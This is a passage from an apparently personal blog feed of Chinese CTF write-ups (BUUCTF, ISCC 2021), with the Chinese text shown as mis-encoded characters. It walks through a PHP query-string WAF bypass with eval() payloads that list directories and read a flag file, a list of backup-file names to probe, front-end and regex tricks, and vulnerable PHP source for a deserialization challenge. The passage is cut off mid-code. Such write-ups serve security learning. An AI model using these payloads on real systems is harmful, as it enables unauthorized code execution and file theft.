alt="image-20210522185134958"></p><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“æœåŠ¡å™¨ç«¯å­˜åœ¨ä¸€ä¸ªWAFï¼›</p><p>æˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹calc.phpï¼š<img src="/buuctf3.assets/image-20210522185307483.png" alt="image-20210522185307483"></p><p>æˆ‘ä»¬çœ‹åˆ°ä»–è¿‡æ»¤äº†ä¸€äº›ç¬¦å·ï¼ŒåŒæ—¶åˆ©ç”¨numä¼ å‚</p><h4 id="è¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass"><a href="#è¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass" class="headerlink" title="è¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass"></a>è¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass</h4><p><strong>æˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo]  =&gt;   â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚</strong></p><p><strong>ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ï¼›å…¶ä¸­<code>%20</code>è¢«åˆ é™¤<code>[</code>è¢«ä¸‹åˆ’çº¿æ›¿æ¢ã€‚</strong></p><p><strong>å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</strong></p><p><code>/news.php?%20news[id%00=a</code></p><p><strong>å› ä¸ºæ­¤æ—¶çš„å˜é‡åæ˜¯<code>%20new[id</code>ï¼Œè€ŒWAFè¯†åˆ«çš„å˜é‡åæ˜¯<code>new_id</code>ï¼Œå½“phpè§£ææ—¶ä¼šå°†<code>%20</code>å’Œ<code>[</code>åˆ å»ï¼Œå°†<code>%20news[id%00</code>çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</strong></p><p><strong>PHPçš„å­—ç¬¦ä¸²è§£æå¯¹éƒ¨åˆ†å­—ç¬¦çš„æ“ä½œï¼š</strong></p><table><thead><tr><th>ç¬¦å·</th><th>æ“ä½œ</th></tr></thead><tbody><tr><td>.</td><td>ä¸‹åˆ’çº¿æ›¿æ¢</td></tr><tr><td>[</td><td>ä¸‹åˆ’çº¿æ›¿æ¢</td></tr><tr><td>%20ï¼ˆ ï¼‰</td><td>åˆ é™¤</td></tr><tr><td>+</td><td>åˆ é™¤</td></tr></tbody></table><p>æˆ‘ä»¬çœ‹åˆ°ç”±äºå­˜åœ¨eval()å‡½æ•°ï¼Œå› æ­¤å­˜åœ¨eval()ä»£ç æ‰§è¡Œæ¼æ´ï¼š</p><p>PHPå‡½æ•°ï¼š<br>ğŸŒ¸scandir()ï¼šä»¥æ•°ç»„å½¢å¼è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•<br>ğŸŒ¸var_dump()ï¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚<br>ğŸŒ¸file_get_contents()ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><p>æ€»ç»“:æˆ‘ä»¬é€šè¿‡PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡é˜²ç«å¢™ï¼Œåˆ©ç”¨eval()ä»£ç æ‰§è¡Œæ¼æ´è·å–flag</p><p><strong>æ„é€ paylaodï¼š</strong></p><p>æ‰«ææœåŠ¡å™¨æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼š<code>calc.php? num=var_dump(scandir(chr(47)))</code></p><p><img src="/buuctf3.assets/image-20210522193141532.png" alt="image-20210522193141532"></p><p>è·å–flaggæ–‡ä»¶çš„å†…å®¹ï¼š<code>calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p><p><img src="/buuctf3.assets/image-20210522193354743.png" alt="image-20210522193354743"></p><h4 id="ï¼Ÿç–‘é—®ï¼š"><a href="#ï¼Ÿç–‘é—®ï¼š" class="headerlink" title="ï¼Ÿç–‘é—®ï¼š"></a>ï¼Ÿç–‘é—®ï¼š</h4><p>ä¸ºä»€ä¹ˆ<code>calc.php?+num=var_dump(system(chr(96).chr(108).chr(115).chr(96)))</code>æ— æ³•è·å–æœåŠ¡å™¨åº•ä¸‹ç›®å½•</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://www.icode9.com/content-4-703121.html">https://www.icode9.com/content-4-703121.html</a></p><p><a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æŠ¤ç½‘æ¯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#æŠ¤ç½‘æ¯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[æŠ¤ç½‘æ¯ 2018]easy_tornado&quot;&gt;&lt;/a&gt;[æŠ¤ç½‘æ¯ 2018]easy_tornado</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>åšé¢˜æ€è·¯</title>
    <link href="http://example.com/2021/05/13/web%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2021/05/13/web%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/</id>
    <published>2021-05-13T11:30:19.000Z</published>
    <updated>2021-05-22T02:26:30.008Z</updated>
    
    <content type="html"><![CDATA[<p>å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š</p><p>.index.php.swp<br>index.php.swp<br>index.php.bak<br>.index.php~<br>index.php.bak_Edietplus<br>index.php.~<br>index.php.<del>1</del><br>index.php<br>index.php~<br>index.php.rar<br>index.php.zip<br>index.php.7z<br>index.php.tar.gz<br>.index.php.swo<br><a href="http://www.rar/">www.rar</a><br><a href="http://www.zip/">www.zip</a><br><a href="http://www.7z/">www.7z</a><br><code>www.tar.gz</code><br><a href="http://www.tar/">www.tar</a><br>web.zip<br>web.rar<br>web.7z<br>web.tar.gz<br>web.tar<br>wwwroot.rar<br>web.rar</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š&lt;/p&gt;
&lt;p&gt;.index.php.swp&lt;br&gt;index.php.swp&lt;br&gt;index.php.bak&lt;br&gt;.index.php~&lt;br&gt;index.php.bak_Edietplus&lt;br&gt;index.php.~&lt;br&gt;index.php.</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>ISCC</title>
    <link href="http://example.com/2021/05/04/2021ISCC/"/>
    <id>http://example.com/2021/05/04/2021ISCC/</id>
    <published>2021-05-04T04:23:03.000Z</published>
    <updated>2021-05-13T10:25:33.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯"><a href="#webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯" class="headerlink" title="webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯"></a>webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯</h1><p>æ‰“å¼€å®¹å™¨ï¼š</p><p><img src="/2021ISCC.assets/1.png" alt="1"></p><p>å‘ç°å³è¾¹é‚£ä¸ªä¼šè‡ªåŠ¨åŠ ç¥¨ï¼Œè€Œä¸”åŠ çš„éå¸¸å¿«ï¼Œå¦‚æœæ‰‹åŠ¨ç‚¹å‡»20ç§’å†…è‚¯å®šå¹²ä¸è¿‡</p><p>æ ¹æ®ç»éªŒè¿™ç§é¢˜è‚¯å®šæ˜¯å‰ç«¯çš„é¢˜ï¼ŒF12æ‰“å¼€æ§åˆ¶å™¨ï¼ŒæŸ¥çœ‹æºç </p><p><img src="/2021ISCC.assets/2.png" alt="2"></p><p>åˆ é™¤ç®­å¤´æ‰€æŒ‡ä¸€è¡Œä»£ç ï¼Œè¿™æ ·å°±æ²¡åŠæ³•ç»™å‡çš„å®¢æœå·ç¥¨ï¼Œç„¶ååœ¨å€’è®¡æ—¶å†…ç–¯ç‹‚ç»™çœŸçš„å®¢æœæŠ•ç¥¨å°±å¥½äº†ã€‚</p><p><img src="/2021ISCC.assets/3.png" alt="3"></p><h1 id="webï¼šè¿™æ˜¯å•¥â€”â€”jsfuck"><a href="#webï¼šè¿™æ˜¯å•¥â€”â€”jsfuck" class="headerlink" title="webï¼šè¿™æ˜¯å•¥â€”â€”jsfuck"></a>webï¼šè¿™æ˜¯å•¥â€”â€”jsfuck</h1><p>æ‰“å¼€å®¹å™¨ï¼š<img src="/2021ISCC.assets/image-20210504180322547.png" alt="image-20210504180322547"></p><p>æŸ¥çœ‹æºç ï¼š<img src="/2021ISCC.assets/4-1620122808281.png" alt="4"></p><p>å‘ç°äº†ä¸€å¤§ä¸²è¿™ç§ç¬¦å·ï¼Œå› ä¸ºä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„ï¼ŒçŸ¥é“è¿™æ˜¯jsfuckç¼–ç ã€‚ç›´æ¥å¤åˆ¶ï¼Œç²˜è´´åœ¨æ§åˆ¶å°ä¸Šå›è½¦æ‰§è¡Œ</p><p><img src="/2021ISCC.assets/5.png" alt="5"></p><h1 id="webï¼šWeb01â€”â€”robotsæ–‡ä»¶-æ­£åˆ™åŒ¹é…"><a href="#webï¼šWeb01â€”â€”robotsæ–‡ä»¶-æ­£åˆ™åŒ¹é…" class="headerlink" title="webï¼šWeb01â€”â€”robotsæ–‡ä»¶+æ­£åˆ™åŒ¹é…"></a>webï¼šWeb01â€”â€”robotsæ–‡ä»¶+æ­£åˆ™åŒ¹é…</h1><p>æ‰“å¼€å®¹å™¨ï¼š<img src="/2021ISCC.assets/6.png" alt="6"></p><p>æŸ¥çœ‹robots.txt<img src="/2021ISCC.assets/7.png" alt="7"></p><p>æ¥ç€è®¿é—®/src/code/code.txtï¼Œè·³å‡º404ï¼Œç„¶åæˆ‘è¯•ç€æŠŠ<code>/src</code>åˆ æ‰ï¼Œç»“æœå°±å¯ä»¥äº†ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘é—®äº†å¤§ä½¬ï¼Œè¿™ä¸ªsrcå°±ä»£æŒ‡äº†ä¸Šé¢çš„ipï¼Œå› æ­¤æˆ‘ä»¬åªè¦è¾“å…¥<code>/code/code.txt</code>å°±å¥½äº†<img src="/2021ISCC.assets/8.png" alt="8"></p><p><strong>ä»£ç å®¡è®¡ï¼š</strong></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é€šè¿‡<code>?password</code>ä¼ å‚ï¼Œå…ˆåˆ¤æ–­passwordçš„å€¼æ˜¯å¦ä¸ºæ˜¯æ—¢å«æ•°å­—åˆå«å­—æ¯çš„ï¼Œæ¥ç€åˆ¤æ–­ä¼ å‚çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦è¶…è¿‡8ï¼ŒåŒæ—¶ä¼ å‚çš„å€¼æ˜¯å¦å¤§äº9999999ï¼Œæœ€ååˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨<code>*-*</code></p><ul><li><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨ç†æ¸…ä¸€ä¸‹è¦æ»¡è¶³çš„æ¡ä»¶ï¼š</p><p>1.è¦æ—¢å«å­—æ¯åˆå«å­—ç¬¦ä¸²</p><p>2.é•¿åº¦ä¸å¾—è¶…è¿‡8ï¼Œä¸”å€¼å¿…é¡»å¤§äº9999999â€”â€”ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</p><p>3.å­˜åœ¨<code>*-*</code></p></li><li><p>é‚£ä¹ˆå¯¹åº”çš„payloadï¼š<code>1e8*-*</code></p></li></ul><p><img src="/2021ISCC.assets/9.png" alt="9"></p><h1 id="webï¼šç™»å½•â€”â€”ç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#webï¼šç™»å½•â€”â€”ç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="webï¼šç™»å½•â€”â€”ç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²+ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>webï¼šç™»å½•â€”â€”ç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²+ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h1><p>åˆšåˆšæ‰“å¼€å®¹å™¨è¿˜ä»¥ä¸ºè¿™æ˜¯ä¸€é“SQLæ³¨å…¥é¢˜ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¼šåæ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œå°è¯•ç”¨dirsearchæ‰«æä¸€ä¸‹æœåŠ¡å™¨ç«¯å£<img src="/2021ISCC.assets/10-1620480644596.png" alt="10"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰å¥½å‡ ä¸ªphpæ–‡ä»¶ï¼Œä½†æ˜¯å‰ä¸‰ä¸ªæ–‡ä»¶æ‰“å¼€åéƒ½æ˜¯ç©ºç™½æ–‡ä»¶ï¼Œå°è¯•æ‰“å¼€ç¬¬å››ä¸ª</p><p>ï¼ˆspï¼šç½‘ç«™çš„æ–‡ä»¶éƒ½æ˜¯æ”¾ç½®åœ¨wwwæ–‡ä»¶å¤¹ä¸‹é¢çš„ï¼Œzipæ˜¯ä¸€ç§å‹ç¼©æ ¼å¼ã€‚ä¹Ÿå°±æ˜¯WWWæ–‡ä»¶å¤¹é‡Œé¢çš„æ–‡ä»¶å…¨éƒ¨å‹ç¼©åœ¨<a href="http://www.zip/">www.zip</a>é‡Œé¢äº†ã€‚ï¼‰</p><p><img src="/2021ISCC.assets/11.png" alt="11"></p><p><img src="/2021ISCC.assets/12.png" alt="12"></p><p>ä¸€ ä¸€æ‰“å¼€æ–‡ä»¶è¿›è¡Œä»£ç å®¡è®¡ä¸€ä¸‹ï¼š</p><p><strong>class.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $table = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$key_list = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line"><span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> $link = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">$config</span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db($config[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$table, $where, $ret = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">$sql = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">$table, $key_list, $value_list</span>) </span>&#123;</span><br><span class="line">$key = implode(<span class="string">&#x27;,&#x27;</span>, $key_list);</span><br><span class="line">$value = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, $value_list) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$table, $key, $value, $where</span>) </span>&#123;</span><br><span class="line">$sql = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>class.phpä¸­çš„é™åˆ¶ï¼š</strong></p><p>1.update_profile ä¸­å¯¹ new_profile ç”¨ filter è¿›è¡Œäº†è¿‡æ»¤ï¼›filterçš„åŠŸèƒ½æ˜¯é€šè¿‡æ­£åˆ™åŒ¹é…æŠŠå­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>æ›¿æ¢æˆ<code>&#39;hacker&#39;</code></p><p><strong>config.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨config.phpä¸­æœ‰å˜é‡flagï¼Œä½†ä¸ºç©ºï¼Œflagåº”è¯¥åœ¨æœåŠ¡å™¨çš„config.phpæ–‡ä»¶ä¸­ï¼Œå¯ä»¥åˆ©ç”¨çš„æ¼æ´è¯»å–æœåŠ¡å™¨çš„flag</p><p><strong>register.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 